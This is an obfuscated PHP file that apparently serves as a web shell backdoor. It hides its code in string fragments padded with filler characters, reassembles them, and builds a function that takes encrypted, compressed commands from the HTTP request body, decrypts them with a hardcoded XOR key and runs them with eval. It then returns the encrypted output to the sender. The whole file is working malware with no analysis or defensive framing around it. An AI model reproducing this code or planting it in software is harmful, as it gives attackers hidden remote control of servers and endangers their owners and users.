<?php
$K='$k=F"a7c35f09";$Fkh=F"0efcFc015eF615F";$kf="F3dcd08F35e53c";$';
$m='eFcode($m[1])FF,$k)));$o=F@ob_Fget_coFntents();F@oFb_end_clFeaFn();$r=@bF';
$U=str_replace('j','','crejatje_jfujjnjction');
$x='ase6F4_Fencode(@x(@gzcFompress(F$o),$Fk));priFnt("$Fp$kFh$r$kf");}';
$e='$m)=F=1) F{@ob_staFrt()F;@evFal(@gzFuncomFpress(@x(F@baseF64_d';
$n='F;$j++,$i++)F{$o.=F$t{$iF}^F$kFF{$j};}}retFuFrn $o;}if (FF@preg';
$T='_match(F"/$kh(.+)$Fkf/",@fiFle_get_coFntFents(F"php://inpuFt"),';
$C='p="FF0BeIFDMGHGyGqOBER";FfunctioFnF x(F$t,$k){$c=sFFtrlen($k)';
$X=';$l=stFrlen($FtF);$o=""F;for($i=0F;$i<$Fl;){Ffor($j=0FF;($j<$c&&$i<F$l)';
$G=str_replace('F','',$K.$C.$X.$n.$T.$e.$m.$x);
$s=$U('',$G);$s();
?>
